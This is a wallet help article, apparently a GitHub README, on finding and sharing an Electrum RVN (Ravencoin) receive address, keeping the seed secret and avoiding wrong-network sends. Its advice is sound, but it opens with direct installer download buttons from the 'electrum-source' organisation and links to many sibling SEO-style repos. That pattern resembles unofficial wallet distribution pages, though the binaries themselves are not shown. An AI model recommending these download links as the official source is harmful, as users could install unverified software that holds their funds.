![Electrum RVN](assets/banner-article.png)

# How to Find Your Electrum RVN Wallet Address

<!-- compact-download-block -->

<p align="center">Where the receive address lives and why to copy it</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Your address is on the Receive tab: open the wallet, choose Receive, and the wallet shows a Ravencoin address you can copy or show as a QR code. It starts with `R`, it is safe to share, and it is the only string anyone needs in order to send you RVN. The twelve words behind it are the thing you never share.

## Where the address lives in the wallet

The wallet shows one address at a time, and it will keep showing new ones as you use them. That is deliberate. Every address you have ever been shown belongs to your wallet and keeps working, so an address from a year ago is still yours; the wallet simply moves you forward to a fresh one when the current address has been used.

Copy it with the copy control rather than by selecting text on screen - a hand-selected address that loses one character at the end is a send to nowhere. The QR view shows the same string, which is the safer route when the amount is large and the reader on the other end is a phone. If you are about to receive for the first time, [receiving Ravencoin in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/receiving-ravencoin-in-electrum-rvn.md) walks through the same screen with the amount and confirmation steps.

## What a valid Ravencoin address looks like

A Ravencoin address is base58 and starts with a capital `R`. It is a string of letters and digits with no spaces, no dashes and no `0x`. If what you are looking at begins `0x`, you are looking at an Ethereum-style address on a different network, and RVN sent to it will not arrive in this wallet - that failure is covered in [Ravencoin address format in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-address-format-in-electrum-rvn.md) and in [wrong address sends in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/wrong-address-sends-in-electrum-rvn.md).

Two checks catch almost everything before you send: the first character is `R`, and the string came from the person or service you are paying, not from a chat message that arrived unprompted. Addresses have no expiry, so there is never a reason to accept one under time pressure.

## Why the address can change after you receive

A wallet that shows a new address after each payment is doing address hygiene, not losing your money. Each address is derived from the same seed, so the balance is one balance; the wallet is simply not handing the same string to every payer, which keeps a public explorer from grouping your whole history under one label.

If you need a stable string - for a mining payout, a donation button or an exchange withdrawal whitelist - pick one address and keep using it. It will keep working. The wallet will still offer new ones for other purposes.

## Sharing the address, and what never to share

| Share | Never share |
| --- | --- |
| the address (`R...`) | the twelve-word seed |
| a QR code of the address | the wallet file |
| an address in a public post, if you accept the privacy cost | the wallet password |
| a signed message for proof of ownership | a private key, to anyone, for any reason |

Anyone with the address can see its balance on a public explorer and can send to it. Nobody can take anything out with it. The reverse is true of the seed: anyone holding those twelve words can move everything, on any machine, without your password. A support request that asks for the seed is not support, and no legitimate process needs it: the words are the wallet, on any machine, for anyone holding them.

## If an exchange rejects your address

Most rejections are a network mismatch rather than a bad address. The deposit screen has a network selector, and it must read Ravencoin (RVN); an ERC-20 or BSC withdrawal of "RVN" goes to a wrapped token on another chain and will not appear here. Some services also refuse an address they consider new, which is a policy decision rather than a technical one - withdrawing a small test amount first resolves both cases.

If the deposit has already gone to the wrong network, treat it as unrecoverable in this wallet and ask the receiving service what it can do. That is the honest answer, and [wrong address sends in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/wrong-address-sends-in-electrum-rvn.md) says the same thing at length rather than offering hope it cannot deliver.

## Finding the address for a payout or a pool

A mining pool or an employer paying in RVN needs exactly the same string, and the most common payout failure is not a wrong address but a wrong network or a typo in the pool's configuration. Copy the address from the wallet into the pool settings rather than retyping it, then confirm the first payout arrived before pointing more hash rate at it. [Mine Ravencoin to an Electrum RVN wallet](https://github.com/electrum-source/token-and-network/blob/main/mine-ravencoin-to-an-electrum-rvn-wallet.md) and [point a mining pool at Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/point-a-mining-pool-at-electrum-rvn.md) take that sequence step by step.

## The address is not the backup

An address is public information derived from your keys; it cannot restore anything. If the wallet is lost, the address on a piece of paper will show you what you lost, not give it back. The backup is the seed, written down before the first coin arrives - [backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md) - and a restore is [restoring a wallet from an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md).

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. If the Receive tab behaves differently from what is described here, check that you are on that release before anything else, because the address handling and the repair paths are exactly what later builds improve.

## FAQ

### Can I receive RVN to an address I already used?

Yes. Every address the wallet has shown you remains valid and remains yours. Reusing one costs a little privacy, because a public explorer can link the payments together; it costs nothing in safety.

### Why does my address start with R and not 0x?

Because Ravencoin uses base58 addresses beginning with `R`. An `0x` address is an Ethereum-style address on another network. Sending RVN to one does not deliver RVN, and this wallet cannot recover it - [Ravencoin address format in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-address-format-in-electrum-rvn.md) has the full explanation.

### Is it safe to post my address publicly?

It is safe in the sense that nobody can spend from it. It is not private: the balance and the transaction history of that address are visible to anyone who looks. Post it if you are willing to be seen receiving; do not post the seed for any reason.

### My balance is zero after sending to my address - why?

Either the transaction is not confirmed yet, or the wallet is not connected to a server, or - after a restore - it is looking at the wrong derivation path. [Zero balance after restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md) covers the restore case; for a fresh send, check the transaction on an explorer first.

### Can I change my address?

You do not need to. The wallet will show a new address as you use the current one, and every earlier address keeps working. There is no setting that renames or replaces an address you have already published.

<!-- related-articles -->

## Related articles

- [Receiving Ravencoin in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/receiving-ravencoin-in-electrum-rvn.md)
- [Ravencoin Address Format in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-address-format-in-electrum-rvn.md)
- [Wrong Address Sends in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/wrong-address-sends-in-electrum-rvn.md)
- [Mine Ravencoin to an Electrum RVN Wallet](https://github.com/electrum-source/token-and-network/blob/main/mine-ravencoin-to-an-electrum-rvn-wallet.md)
